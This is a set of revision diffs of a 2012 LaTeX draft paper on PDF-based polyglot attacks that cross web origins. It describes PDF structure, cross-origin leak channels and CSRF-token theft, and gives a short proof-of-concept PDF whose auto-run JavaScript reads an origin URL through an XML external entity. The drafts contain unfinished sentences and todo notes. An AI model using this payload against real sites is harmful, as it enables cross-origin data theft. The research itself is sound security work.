+will reduce the attack surface. It is, however, not a complete 
 mitigation approach. Since the PDF format is a container format it is designed to 
 embed syntax from other files. Even when parsing strictly according to 
-the specification, it would be a simple task to create a PDF-based polyglot.
+the specification, it is a simple task to create a PDF-based polyglot.
 
@@
 %1-2 pages 
-\bibliographystyle{IEEEtran}
+\bibliographystyle{plain}
 \bibliography{literature}
+
+\newpage
+\section*{Todo}
+Test page
 

### 2012-11-27 main.tex
Updated section on PDF

@@
 \section{Crossing origins by crossing formats}
-
+\label{sec:cross}
 % Describe how the attacks lead to Same-Origin Policy bypass.
@@
 
-In this section we give concrete examples of the attacks described in the
-previous section, using the PDF format as the running example.
+In this section we give concrete examples of the attacks described in 
+Section~\ref{sec:cross}, using the PDF format as the running example. We begin
+by detailing how the design decision made in the PDF-standard make it ideal 
+for creating malicious polyglots.
 
-\subsection{Concept}
+%\subsection{Concept}
 
@@
 
-The PDF format is a widely used, text based format with powerful capabilities.
-It is capable of displaying text, rendering graphics, animation and dynamic
-content. It is a container format which allows for embedding of other files
-and formats. This and the fact that it is designed to be robust against errors,
-provides us with a format that is powerful, flexible and ideal for creating
-malicious polyglots.
+The \emph{Portable Document Format} (PDF) is a widely used document format capable of displaying text, 
+rendering graphics, scripting, animation and other dynamic content.
+
+\subsubsection{File structure}
+% header
+% objects
+% cross-reference
+% trailer
+
+According to the PDF specification \todo{cite specification} a PDF document consists of
+a header, several objects, a cross-reference section and a trailer.
+
+\paragraph{Header}
+The header consists of the string "\%PDF-" followed by a version number. 
+According to the PDF reference implementation notes, the header can occur 
+anywhere within the first 1024 bytes of the file. The version is denoted by a 
+major and a minor version number of the form "M.m". Because the version can 
+be specified elsewhere, the version number is not required to be part of the 
+header.
+
+\paragraph{Objects}
+Objects can be direct or indirect, the difference being that indirect objects 
+has labels which are used for referring to the object from another object. Object labels 
+There are eight basic types of basic objects; booleans, integers, strings, names, 
+arrays, dictionaries, streams and the null object. For the intents and purposes 
+of this article, we will focus on the string, dictionary and stream objects.
+
+% dictionary objects
+% string objects
+% stream objects
+
+String objects are delimited by the "(" and ")" characters.
+
+Dictionary objects are delimited by the "<<" and ">>" tokens.
+
+Stream objects
+
+\paragraph{Cross-reference}
+The cross-reference section is a record of the location of indirect objects 
+within a file. The location is specified as the byte offset from the beginning 
+of the file. The cross-reference section is opened with the "xref" keyword,
+followed by one record for each indirect object. The cross-reference section 
+will be reconstructed if missing and can therefore be omitted.
+
+\paragraph{Trailer}
+The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
+section and an end-of-file marker. The trailer dictionary is introduced by the 
+"trailer" keyword. It contains among other things a reference to the root of the 
+object tree. The "startxref" keyword is followed by the number of bytes from 
+the beginning of the file to the first cross-reference section. As with the 
+cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
+end-of-file, but can be omitted.
+
+% actions?
+
+\begin{lstlisting}[label=lst:sample-pdf, caption=HTML / E4X Polyglot]
+%PDF-1.7
+1 0 obj<</Type/Catalog/Pages<<>>>>
+endobj
+2 0 obj<</Length 13>>
+stream
+Sample Author
+endstream
+endobj
+xref
+0000000000 65536 f
+0000000009 00000 n
+0000000057 00000 n
+trailer<</Root 1 0 R/Info<</Author 2 0 obj>>>>
+startxref
+127
+%%EOF
+\end{lstlisting}
+
+\subsubsection{PDF-based polyglots}
+Several design choices in the PDF specification make the format particularly 
+suitable for making polyglots. It is a container format in the sense that it allows 
+embedding of files and resources. Therefore a PDF file can, by design, contain foreign syntax that 
+could interfere with its syntax and hence the parsing is designed to be error 
+tolerant. Another motivation for this design choice is that PDF files can be 
+incrementally updated, by appending updated versions of existing objects to 
+the end of the file. In fact, 
+%and formats. This and the fact that it is designed to be robust against errors,
+%provides us with a format that is powerful, flexible and ideal for creating
+%malicious polyglots.
 
@@
 % - Error tolerant parsing
+% - Backward compatibility
+% - Container format
 % - Execute JavaScript
@@
 
+\begin{lstlisting}[label=lst:minimal-pdf, caption=HTML / E4X Polyglot]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
+
 \subsubsection{PDF communication channels}
@@
 For communication with the containing page, one can either use
-hostContainer.postMessage(info) or app.launchURL('\#'+info). The latter has the
+hostContainer.postMessage(info) or app.launchURL('\#' + info). The latter has the
 advantage that it works in Firefox which seems to not handle the postMessage
@@
 
-\begin{lstlisting}[label=lst:minimal-pdf, caption=HTML / E4X Polyglot]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
-\end{lstlisting}
-
 This means the required tokens that we need to be able to inject are: \%PDF-,
@@
 
-var s = 'user string<\\/script>';
+var s = 'user string</script>';
 
@@
 \subsection{Content repurposing}
+
+%3 pages 
+\section{Evaluation}
 
@@
 Not tested: Apple Preview
-
-%3 pages 
-\section{Evaluation}
 

### 2012-11-29 main.tex
Major update to section "Vulnerabilities and attacks"

--- 2012-11-22 main.tex
@@
 
-In this section we give concrete examples of the attacks described in the
-previous section, using the PDF format as the running example.
+In this section we give concrete examples of the attacks described in 
+Section~\ref{sec:cross}, using the PDF format as the running example. We begin
+by detailing how the design decision made in the PDF-standard make it ideal 
+for creating malicious polyglots.
 
-\subsection{Concept}
+%\subsection{Concept}
 
-\subsection{The PDF format}
-
+\subsection{Portable Document Format}
+\label{sec:format}
 % Why PDF format?
 
-The PDF format is a widely used, text based format with powerful capabilities.
-It is capable of displaying text, rendering graphics, animation and dynamic
-content. It is a container format which allows for embedding of other files
-and formats. This and the fact that it is designed to be robust against errors,
-provides us with a format that is powerful, flexible and ideal for creating
-malicious polyglots.
+The \emph{Portable Document Format} (PDF) is a widely used document format 
+capable of displaying text, rendering graphics, scripting, animation and other 
+dynamic content. It is a container format in the sense that it allows 
+embedding of files and resources.
 
-% Several design choices
+According to the PDF specification \todo{cite specification} a PDF file is composed of
+a header, several objects, a cross-reference section and a trailer. Listing~\ref{lst:sample-pdf} 
+shows a sample of how a PDF file is structured and its elements.
 
-% - Error tolerant parsing
+% header
+\subsubsection{Header}
+The header consists of the string "\%PDF-" followed by a version number. 
+The version is denoted by a 
+major and a minor version number of the form "\emph{M.m}". Because the version can 
+be specified elsewhere, the version number is not required to be part of the 
+header.
+
+% objects
+\subsubsection{Objects}
+Objects can be direct or indirect, the difference being that indirect objects 
+has labels which are used for referring to the object from another object. Object 
+labels are numbered and begin with the string "\emph{N n} obj", where "N" is the object number and "n" is the 
+revision number. Similarly object references are of the form "\emph{N n} R".
+The label is optionally ended with the keyword "endobj".
+
+There are eight basic types of basic objects; booleans, integers, strings, names, 
+arrays, dictionaries, streams and the null object. For the intents and purposes 
+of this article, we will focus on the string, dictionary, name and stream objects.
+
+% string objects
+\paragraph{String objects}
+There are two types of strings; literal and hexadecimal. Literal strings are 
+enclosed by the "(" and ")" characters. Any character can occur in a literal 
+string, even parentheses if they are balanced, e.g. a matching closing 
+parenthesis for every opened parenthesis. In hexadecimal strings 
+each character is represented by its corresponding hexadecimal value, enclosed 
+by the "$<$" and "$>$" characters.
+
+% dictionary objects
+\paragraph{Dictionary objects}
+Dictionary objects are a name-value map delimited by the "$<<$" and "$>>$" 
+tokens. The names are name objects and the values are objects of any type.
+% name objects
+Name objects begin with the "/" character, followed by a string of non-whitespace 
+characters. Each dictionary has a type, either specified by the "/Type" name or inferred 
+from the context in which it occurs. The type declares which kind of element the 
+dictionary is describing, e.g. a page or an annotation. Dictionaries form the structure of the document by connecting
+objects through references, e.g. relating a page to its contents. %At least one 
+%dictionary is required to build a PDF document. 
+% actions?
+A special type of dictionary describes \emph{actions}. Actions are triggered when a
+certain event occur, such as a file is opened or a page is displayed, and the action 
+dictionary specify how it should be handled. Actions can be used to, among other 
+things, go to a specific page, play a sound, execute JavaScript or launch a command.
+
+% stream objects
+\paragraph{Stream objects}
+A stream is an unlimited sequence of bytes. A stream object consists of a 
+dictionary, describing the stream, and the associated stream delimited by the 
+"stream" and "endstream" keywords. PDF supports encoding of streams, in which
+case the dictionary describe which filters are required to decode the stream.
+
+% cross-reference
+\subsubsection{Cross-reference}
+The cross-reference section is a record of the location of indirect objects 
+within a file. The location is specified as the byte offset from the beginning 
+of the file. The cross-reference section is opened with the "xref" keyword,
+followed by one record for each indirect object. The cross-reference section 
+will be reconstructed if missing and can therefore be omitted.
+
+% trailer
+\subsubsection{Trailer}
+The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
+section and an end-of-file marker. The trailer dictionary is introduced by the 
+"trailer" keyword. It contains among other things a reference to the root of the 
+document structure. The "startxref" keyword is followed by the number of bytes from 
+the beginning of the file to the first cross-reference section. As with the 
+cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
+end-of-file, but can be omitted.
+
+\begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
+%PDF-1.7
+1 0 obj<</Type/Catalog/Pages<<>>>>
+endobj
+2 0 obj<</Length 13>>stream
+Sample Author
+endstream
+endobj
+xref
+0 3
+0000000000 65536 f
+0000000009 00000 n
+0000000057 00000 n
+trailer<</Root 1 0 R
+	/Info<</Author 2 0 R>>
+>>
+startxref
+118
+%%EOF
+\end{lstlisting}
+
+\subsection{PDF-based polyglots}
+Several design choices in the PDF specification make the format particularly 
+suitable for making polyglots. One such design choice is the error tolerant 
+parser. This is in part motivated it being a container format, of which the 
+implication is that a PDF file can, by design, contain foreign syntax that 
+could interfere with the syntax of the file. Another motivation is that PDF 
+files are designed to be both forward- and backward-compatible. Readers 
+implementing an older version of the specification do not recognize new 
+features and behave as if they were not present in the file. 
+%
+The implementation notes of the specification describes some exceptions to the
+requirements of the specification, such as the header can occur 
+anywhere within the first 1024 bytes of the file. This flexibility gives plenty of room for 
+combining with syntax of another format.
+%
+The specification declares many components to be required in a
+PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
+components can be omitted. The code in Listing~\ref{lst:minimal-pdf} shows the 
+minimal syntax required for a malformed, but valid PDF file.\todo{cite Julia Wolf?}
+%incrementally 
+%updated by appending updated versions of existing objects to 
+%the end of the file. In fact, 
+%and formats. This and the fact that it is designed to be robust against errors,
+%provides us with a format that is powerful, flexible and ideal for creating
+%malicious polyglots.
+
 % - Execute JavaScript
@@
 % - Launch commands
+% - Network requests
 
-Furthermore the PDF format is of particular interest to us because it can
-execute JavaScript and send HTTP requests to the server from which the document
-originated.
+Furthermore the PDF format is of particular interest to us because of its 
+many capabilities. Some examples include executing JavaScript, launching commands, 
+and issuing HTTP requests. Adobe Reader even includes a flash 
+player to play embedded flash files on systems that do
+not have a player installed. %Considering that it might be a conscious decision
+%of the user to refuse a flash player,
 
-\subsubsection{PDF communication channels}
+\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
 
-For communication with the containing page, one can either use
-hostContainer.postMessage(info) or app.launchURL('\#'+info). The latter has the
-advantage that it works in Firefox which seems to not handle the postMessage
-very well.
-
-\subsection{The object-tag}
-
+\subsection{The object- and embed-tags}
+\todo{consider renaming to "Embedded PDF documents", and describe the plug-in behaviour, origin of content, type handling, cookies?}
 %The object-tag allows the developer to specify which format 
@@
 
-The object-tag is used to embed content, which requires a browser plug-in
+\todo{consider moving to section "Crossing origins"}
+The object- and embed-tags are used to embed content, which requires a browser plug-in
 to run, in a web page. The plug-in is selected based on the MIME-type of the content, but
@@
 
+\todo{consider revising}
 As it turns out, various browser plug-ins deal with the situation differently. The Chrome browser
@@
 
+\subsection{PDF communication primitives}
+
+% Cross-origin leaks
+To leak information across origins, a communication channel is 
+required between the attacker and the target. PDF provides the necessary means 
+to mediate this information leakage. The flow of information can be divided into 
+two steps, extracting information from the target and delivering it to the attacker.
+Each requiring its own communication primitives.
+
+When embedded in a web page, many of the PDF communication primitives utilize
+the underlying browser to make requests by navigating the browser to the target 
+URL. This will unload the current page in which the document is embedded. Such 
+primitives can be used in Cross-Site Request Forgery (CSRF) attacks, but would 
+defeat the purpose of requesting information as the document cannot process the 
+response.
+
+\subsubsection{The target}
+There are two primitives for a PDF to communicate with the server it originated from, 
+that allow it to read the response; from JavaScript using XML external entities 
+or from an embedded flash file.
+
+\paragraph{XML}
+The PDF JavaScript API includes a method to parse an XML document, called 
+XMLData.parse. The XML document being processed may rely on external entities, 
+which the XML parser will request and include in the document. The request is 
+bound to the origin of the document. As the response 
+is included in the document, it has to be valid, well-formed XML. This puts a 
+restriction on the content that can be requested using this method. Considering 
+that HTML pages are rarely well-formed this method may be too restricted.
+Listing~\ref{lst:xml-pdf} contains an example that uses XML external entities.
+
+\paragraph{Embedded Flash}
+The embedded flash file inherits the origin of the document, thus it can 
+request and read any document from the originating server. Unlike the XML
+method, there is no restrictions on what content can be requested.
+
+\begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
+%PDF-
+1 0 obj<<>>stream
+xml = '<!DOCTYPE foo[<!ENTITY x SYSTEM "'+
+	URL+'">]><foo>&x;</foo>'
+app.alert(XMLData.parse(xml).saveXML())
+endstream
+trailer<</Root<</Pages<<>>
+    /OpenAction<</S/JavaScript/JS 1 0 R>>
+    >>
+>>
+\end{lstlisting}
+
+\subsubsection{The attacker}
+There are a number of ways to communicate with the attacker, either directly 
+via the embedding page or through the attackers server. While it is not To prevent the document from unloading
+
+\paragraph{PostMessage}
+The PDF plugin includes an API for communicating directly with the page in 
+which it is embedded. The document can send messages to the page using 
+the hostContainer.postMessage method.
+
+\paragraph{Hash transport}
+
+\paragraph{Embedded Flash}
+Cross-origin communication in Flash is restricted by Cross-Origin Resource Sharing. 
+As mentioned, the embedded Flash file inherits the origin of the document.
+However, this is not a restriction, since an attacker can set a cross-origin policy 
+that allow the request.
+
 \subsection{Syntax injection}
@@
 the minimal malformed structure that is required for Adobe Reader to consider ita PDF.
-
-\begin{lstlisting}[label=lst:minimal-pdf, caption=HTML / E4X Polyglot]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
-\end{lstlisting}
 

### 2012-11-29 main.tex
realed work

@@
 
+% From ASIACCS'13 CFP
+% Submissions must be written in English, and must be at most 10 pages
+% excluding the bibliography and well-marked appendices, and at most
+% 12 pages overall.
+
 \usepackage{listings}
+\usepackage{url}
 
@@
 
+Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
+language. PostScript allows executable content and access to sensitive
+information from the environment such as the user id. This work
+demonstrates how to compromise reviewer anonymity in a peer-reviewing
+process by maliciously crafting a PostScript document.
+
+Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
+same file being interpreted as a script and as an image and
+informally discuses possible security implications.
+
+Barth et al.~\cite{Barth+:SP09}
+
+Sundareswaran and Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10}
+
 %1 page 

### 2012-11-29 main.tex
Updates to Vulnerabilities and attacks

--- 2012-11-29 main.tex
@@
 \subsection{Crossing origins}
+\label{sec:cross-origin}
 
@@
 but the browsers are forced to rely on the plug-ins to employ correct security 
-measures to prevent information leaks. While the containing page is restricted 
+measures to prevent information leaks. The plug-in is selected based on the MIME-type of the content, but
+because the server delivering the content might not be able to determine its
+format, the object tag allows a developer to set the type-attribute to guide the
+browser in which plug-in to run. When the type attribute is used, the
+corresponding plug-in is run regardless of which MIME-type the server returns
+and it is up to the plug-in to respond to and handle the content it is served. While the containing page is restricted 
 from directly accessing the content handled by the plug-in, a number of plugins provide 
@@
 
-\subsection{The object- and embed-tags}
-\todo{consider renaming to "Embedded PDF documents", and describe the plug-in behaviour, origin of content, type handling, cookies?}
-%The object-tag allows the developer to specify which format 
-%the embedded content should be interpreted as.
+\subsection{Embedded PDF documents}
+\todo{Not sure how well it fits here}
+When a PDF document is embedded in a web page, the corresponding plugin 
+is executed to render the content. Recall from Section~\ref{sec:cross-origin} 
+that the plug-in is selected based 
+on the MIME-type, either supplied by the server or in the type attribute, and 
+that the browser rely on the plug-in to handle the situation when the MIME-type 
+supplied by the server is in appropriate for the plug-in.
+In the case of the Adobe Reader plug-in, it disregards the MIME-type
+supplied by the server and will attempt to interpret any content as PDF.
 
-\todo{consider moving to section "Crossing origins"}
-The object- and embed-tags are used to embed content, which requires a browser plug-in
-to run, in a web page. The plug-in is selected based on the MIME-type of the content, but
-because the server delivering the content might not be able to determine its
-format, the object tag allows a developer to set the type-attribute to guide the
-browser in which plug-in to run. When the type attribute is used, the
-corresponding plug-in is run regardless of which MIME-type the server returns
-and it is up to the plug-in to respond to and handle the content it is served.
+\subsection{PDF communication methods}
 
-\todo{consider revising}
-As it turns out, various browser plug-ins deal with the situation differently. The Chrome browser
-built-in PDF reader refuses to render content that was served with an inappropriate 
-MIME-type. The Java plug-in used to ignore the MIME-type, but after several 
-vulnerabilities were disclosed, this behavior was changed.
+The embedded document will retain the origin from which it was served. Any 
+request issued from the document will include any cookies available in the 
+browser for the target domain. This provides an attacker with the means to 
+perform actions in the name of an authenticated victim, i.e. Cross-Site Request 
+Forgery (CSRF). If the attacker can extract information, such as a CSRF-token, 
+the protection mechanism is defeated. \todo{this is describing another attack scenario, expand?}
 
-In the case of the Adobe Reader plug-in, it completely disregards the MIME-type
-supplied by the server and will attempt to interpret any content as PDF. If the 
-Chrome browser is configured to use the Adobe Reader plug-in, the behavior will 
-be the same as in other browsers and the content will be interpreted as PDF.
-
-\subsection{PDF communication primitives}
+When embedded in a web page, many of the PDF communication methods utilize
+the underlying browser to make requests by navigating the browser to the target 
+URL. This will unload the current page in which the document is embedded. Page 
+navigation is allowed wtih respect to the SOP, since the response is not visible 
+to the document. Such methods can be used in CSRF attacks, but would 
+defeat the purpose of requesting information as the document cannot process the 
+response.
 
@@
 two steps, extracting information from the target and delivering it to the attacker.
-Each requiring its own communication primitives.
-
-When embedded in a web page, many of the PDF communication primitives utilize
-the underlying browser to make requests by navigating the browser to the target 
-URL. This will unload the current page in which the document is embedded. Such 
-primitives can be used in Cross-Site Request Forgery (CSRF) attacks, but would 
-defeat the purpose of requesting information as the document cannot process the 
-response.
+Each requiring its own communication methods.
 
 \subsubsection{The target}
-There are two primitives for a PDF to communicate with the server it originated from, 
+There are two methods for a PDF to communicate with the server it originated from, 
 that allow it to read the response; from JavaScript using XML external entities 
@@
 bound to the origin of the document. As the response 
-is included in the document, it has to be valid, well-formed XML. This puts a 
+is included in the XML, the result has to be well-formed XML. This puts a 
 restriction on the content that can be requested using this method. Considering 
-that HTML pages are rarely well-formed this method may be too restricted.
+that HTML pages are rarely well-formed this method may be too restricted in practice.
 Listing~\ref{lst:xml-pdf} contains an example that uses XML external entities.
@@
 There are a number of ways to communicate with the attacker, either directly 
-via the embedding page or through the attackers server. While it is not To prevent the document from unloading
+via the embedding page or through the attackers server. As mentioned previously, 
+many methods trigger page navigation in the browser. This will result in a 
+noticeable change in the victims browser. While it fulfills the purpose of 
+leaking information, an attacker can use more covert methods of communication
+to refrain from alerting the victim.
+
+\paragraph{Fragment identifier}
+The methods that navigate the browser can still be used for a somewhat covert 
+communication with the attacker. Navigating to the same page with a different 
+fragment identifier will not reload the page. Embedding the information in the fragment 
+identifier of the URL of the embedding website, creates a one-way communication 
+channel from the document to the page. Since the fragment identifier is visible 
+in the address field of the browser, an alert user would notice it changing.
 
@@
 which it is embedded. The document can send messages to the page using 
-the hostContainer.postMessage method.
-
-\paragraph{Hash transport}
+the hostContainer.postMessage method. The page registers a handler to receive 
+the event and is also able to post messages back to the document.
+This two way communication is not visible to the victim.
 
 \paragraph{Embedded Flash}
-Cross-origin communication in Flash is restricted by Cross-Origin Resource Sharing. 
+Cross-origin communication in Flash is restricted by the Same-Origin Policy,
+but also support cross-origin communication via Cross-Origin Resource Sharing 
+(CORS). Using CORS, a web server can relax the SOP to allow access to specified content.
 As mentioned, the embedded Flash file inherits the origin of the document.
 However, this is not a restriction, since an attacker can set a cross-origin policy 
-that allow the request.
+that allow the request. This allows for a two way communication that is not 
+visible to the victim.
 
@@
 \subsubsection{Readers}
+
+\todo{see if this makes sense here}
+As it turns out, various browser plug-ins deal with the situation differently. The Chrome browser
+built-in PDF reader refuses to render content that was served with an inappropriate 
+MIME-type. If the 
+Chrome browser is configured to use the Adobe Reader plug-in, the behavior will 
+be the same as in other browsers and the content will be interpreted as PDF.
+The Java plug-in used to ignore the MIME-type, but after several 
+vulnerabilities were disclosed, this behavior was changed.
 

### 2012-11-29 main.tex
intro

@@
 
-General introduction for web application security.
+Web application security is concerned with protecting information as
+it is manipulated by web applications. The different trust domains
+correspond to different Internet origins. A major goal for web
+application security is preventing undesired communication across
+origins. 
+%
+With the goal of separating information from the different origins,
+today's browsers enforce the \emph{same-origin policy} (SOP). SOP
+restricts only allows access between two documents if they share the
+origin. In addition, a document can only directly communicate with the
+server from which it originates.
 
-The following attacks have been particularly successful (support with
-references).
+There are several classes of cross-domain attacks that circumvent SOP.
+The OWASP top 10 list~\cite{OWASP:top10:10} places injection
+and \emph{cross-site scripting} (XSS) attacks as two top security
+risks for web applications.
+%
+A classical XSS attack injects a malicious script in the context of a
+trusted origin. This opens up opportunities for leaking sensitive
+information that users might have in the context of the trusted origin
+such as cookies, personal information, and session tokens.
 
-\subsection{Injection attacks}
+XSS attacks are relatively well understood by researchers and
+developers~\cite{XSS:understood}. Known defense include various
+flavors of \emph{sanitization} on server side and the
+\emph{content security policy} (CSP) on client side. Sanitization
+is often performed by the server which sanitizes input data
+before it is used in the generated web pages. Content security policy puts
+requirement on the structure of the document and the origins of the
+scripts that are included by web pages.
 
-Injection attacks have gone from classical to sophisticated.
+This paper identifies a new breed of attacks and its root cause:
+\emph{polyglots}. 
+%
+In a heterogeneous system like the web, information is exchanged
+between components in versatile formats.
+%
+This gives rise to attacks that exploit the mismatch between the
+expected and provided content.
+%
+The existing defense mechanisms fall short to prevent these attacks
+from achieving cross-domain communication.
 
-New breed of attacks.
+A polyglot is a program that is valid in multiple programming languages. Polyglots allow
+multiple interpretation of the content, providing a new space of attack vectors.
+We characterize of what constitutes a dangerous format in the web setting and
+identify particularly dangerous formats, with PDF as the prime example. We
+demonstrate that polyglot-based attacks on the web open up for insecure
+communication across Internet origins. We perform a systematic study of
+PDF-based injection and content repurposing attacks. We evaluate the current
+practice in client/server content filtering and PDF readers for polyglot-based
+attacks, and report on vulnerabilities in the top 100 Alexa web sites. Our
+recommendations for protective measures on server side, in browsers, and in content
+interpreters (such as PDF readers) show how to mitigate the attacks.
 
-\subsection{Content repurposing attacks}
+\todo{Emphasize novel attack vectors}
 
-Server side verification
+\emph{Injection attacks} are becoming increasingly more sophisticated by
+operating across multiple languages. \emph{Content repurposing} attacks supply
+malicious payload that appears formatted as benign content.
 
-Examples
-
-Bridge to the next section saying that we take these attacks to the next level.
-
-\todo{Define SOP}
+The paper is organized as follows...
 
@@
 well; a document can only directly communicate with the server from which it originated. 
-This is not to be confused with Cross-Origin Resource Sharing (CORS), which is an 
+This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{CORS}, which is an 
 intentional relaxing of the SOP.

### 2012-11-30 main.tex
intro

@@
 \label{sec:intro}
+Web application security is concerned with protecting information as
+it is manipulated by web applications. This is an important area
+because ``attacks against web
+applications constitute more than 60\% of the total attack attempts
+observed on the Internet''~\cite{SANS09}.
 
-Web application security is concerned with protecting information as
-it is manipulated by web applications. The different trust domains
+\paragraph{Internet origins at stake}
+The different trust domains
 correspond to different Internet origins. A major goal for web
@@
 
+\paragraph{Classical cross-domain attacks}
 There are several classes of cross-domain attacks that circumvent SOP.
-The OWASP top 10 list~\cite{OWASP:top10:10} places injection
+The OWASP top 10 list~\cite{OWASP:top10:2010} places injection
 and \emph{cross-site scripting} (XSS) attacks as two top security
@@
 XSS attacks are relatively well understood by researchers and
-developers~\cite{XSS:understood}. Known defense include various
+developers~\cite{XSSED}. Known defense include various
 flavors of \emph{sanitization} on server side and the
@@
 
+\paragraph{Crossing origins by crossing formats}
 This paper identifies a new breed of attacks and its root cause:
 \emph{polyglots}. 
+%
+A polyglot is a program that is valid in multiple programming languages.
 %
@@
 
-A polyglot is a program that is valid in multiple programming languages. Polyglots allow
+Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
+We present (novel attack vectors that are based on (i)
+\emph{injection attacks} that 
+operate across multiple languages and (ii) \emph{content repurposing} that supply
+malicious payload that appears formatted as benign content.
+
 We characterize of what constitutes a dangerous format in the web setting and
@@
 communication across Internet origins. We perform a systematic study of
-PDF-based injection and content repurposing attacks. We evaluate the current
+PDF-based injection and content repurposing attacks.
+
+\paragraph{Evaluation and mitigation}
+We evaluate the current
 practice in client/server content filtering and PDF readers for polyglot-based
@@
 
-\todo{Emphasize novel attack vectors}
+\paragraph{Contributions} The paper makes the following contributions:
+\begin{itemize}
+\vspace*{-.6cm}
+\item We identify polyglot attacks, a new breed of attacks for
+  crossing origins by crossing formats;
+\vspace*{-.2cm}
+\item We characterize the necessary ingredients for polyglot attacks
+\vspace*{-.2cm}
+\item We arrive at the PDF format as a particularly exposed format for
+  polyglot-based attacks;
+\vspace*{-.2cm}
+\item We present two novel attack vectors, based on syntax and
+  injection and content repurposing;
+\vspace*{-.2cm}
+\item We evaluate the current filtering mechanisms, browsers, and PDF
+  filters for vulnerabilities; and
+\vspace*{-.2cm}
+\item We propose mitigation for the server, client, and PDF readers.
+\end{itemize}
 
-\emph{Injection attacks} are becoming increasingly more sophisticated by
-operating across multiple languages. \emph{Content repurposing} attacks supply
-malicious payload that appears formatted as benign content.
-
-The paper is organized as follows...
+\paragraph{Overview}
+The paper is organized as follows. 
+%
+Section~\ref{sec:cross} explains the concept of crossing origins by
+crossing formats, identifies necessary ingredients, and provides
+attack scenarios.
+%
+Section~\ref{sec:vuln} focuses on the PDF format and describes
+concrete vulnerabilities and attacks.
+%
+Section~\ref{sec:eval} evaluates the current practice in client/server
+content filtering and PDF readers and report on vulnerabilities in the
+top 100 Alexa web sites.
+%
+Section~\ref{sec:mit} suggests mitigation for servers, clients, and
+PDF readers.
+%
+Section~\ref{sec:related} discusses the related work.
+%
+Section~\ref{sec:conc} concludes and outlines future work.
 
@@
 well; a document can only directly communicate with the server from which it originated. 
-This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{CORS}, which is an 
+This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{w3-cors}, which is an 
 intentional relaxing of the SOP.
@@
 \section{Evaluation}
+\label{sec:eval}
 
@@
 \section{Mitigation}
-
+\label{sec:mit}
 This section will describe our recommendations for mitigation in each of the
@@
 \section{Related work}
-
+\label{sec:related}
 Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
@@
 \section{Conclusions}
+\label{sec:conc}
 We have put a spotlight on a new breed of attacks that smuggle

### 2012-11-30 main.tex
intro

@@
 the rise that exploit the mismatch between the expected and provided content.
-\emph{Injection attacks} are becoming increasingly more sophisticated by
-operating across multiple languages. \emph{Content repurposing} attacks supply
-malicious payload that appears formatted as benign content. 
 % 
-This paper focuses on the root cause of a large class of attacks: \emph{polyglots}. 
+This paper identifies the root cause of a large class of attacks: \emph{polyglots}. 
 A polyglot is a program that is valid in multiple programming languages. Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
+%
 We characterize of what constitutes a dangerous format in the web setting and
@@
 demonstrate that polyglot-based attacks on the web open up for insecure
-communication across Internet origins. We perform a systematic study of
+communication across Internet origins. 
+%
+The paper presents novel attack vectors that are based on
+\emph{syntax injection} that 
+operate across multiple languages and on \emph{content repurposing} that supply
+malicious payload that appears formatted as benign content. 
+%
+We perform a systematic study of
 PDF-based injection and content repurposing attacks. We evaluate the current
@@
 today's browsers enforce the \emph{same-origin policy} (SOP). SOP
-restricts only allows access between two documents if they share the
+only allows access between two documents if they share the
 origin. In addition, a document can only directly communicate with the
@@
 There are several classes of cross-domain attacks that circumvent SOP.
-The OWASP top 10 list~\cite{OWASP:top10:2010} places injection
+The OWASP top 10 list~\cite{OWASP:top10:2010} places \emph{injection}
 and \emph{cross-site scripting} (XSS) attacks as two top security
@@
 flavors of \emph{sanitization} on server side and the
-\emph{content security policy} (CSP) on client side. Sanitization
-is often performed by the server which sanitizes input data
+\emph{content security policy}~\cite{CSP1.0} (CSP) on client side. Sanitization
+is often performed by the server to filter possibly malicious input data
 before it is used in the generated web pages. Content security policy puts
@@
 multiple interpretation of the content, providing a new space of attack vectors.
-We present (novel attack vectors that are based on (i)
-\emph{injection attacks} that 
-operate across multiple languages and (ii) \emph{content repurposing} that supply
+We present novel attack vectors that are based on (i)
+\emph{syntax injection} that 
+operate across multiple languages and on (ii) \emph{content repurposing} that supply
 malicious payload that appears formatted as benign content.
@@
 
-%In literature we find Content repurposing, content smuggling, chameleon, gifar
+\todo{
+In literature we find Content repurposing, content smuggling,
+chameleon, gifar; say that we have called it content smuggling
+ourselves in case someone discovers the blog
+}
 
@@
 
+Wolf~ OMG WTF PDF talk at CCC in 2010.
+
 %1 page 

### 2012-11-30 main.tex
intro

@@
 
+\todo{Say why sanitization and CSP are of no use}
+
+\todo{Mention GIFAR and perhaps other profile examples and say we're
+  the first to perform a systematic study}
+
 We characterize of what constitutes a dangerous format in the web setting and
@@
 \label{sec:cross}
-% Describe how the attacks lead to Same-Origin Policy bypass.
+% Describe how the attacks lead to same-origin policy bypass.
 
 This section describes how formats can be crossed and how that can be abused 
-to cross origins by circumventing the Same-Origin Policy. We begin by 
+to cross origins by circumventing the same-origin policy. We begin by 
 generalizing the problem of crossing formats to \emph{polyglots} and then describe the  
@@
 By crossing origins we mean being able to request and access content
-which is normally restricted under the Same-Origin Policy. 
-Recall that SOP dictates that a two document can only access each others 
-content and resources if they share the same origin. Similarly this applies to communication as 
-well; a document can only directly communicate with the server from which it originated. 
-This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{w3-cors}, which is an 
-intentional relaxing of the SOP.
+which is normally restricted under the same-origin policy. 
+Recall that SOP only allows two documents accessing each others'
+content and resources if they share the origin. Similarly,
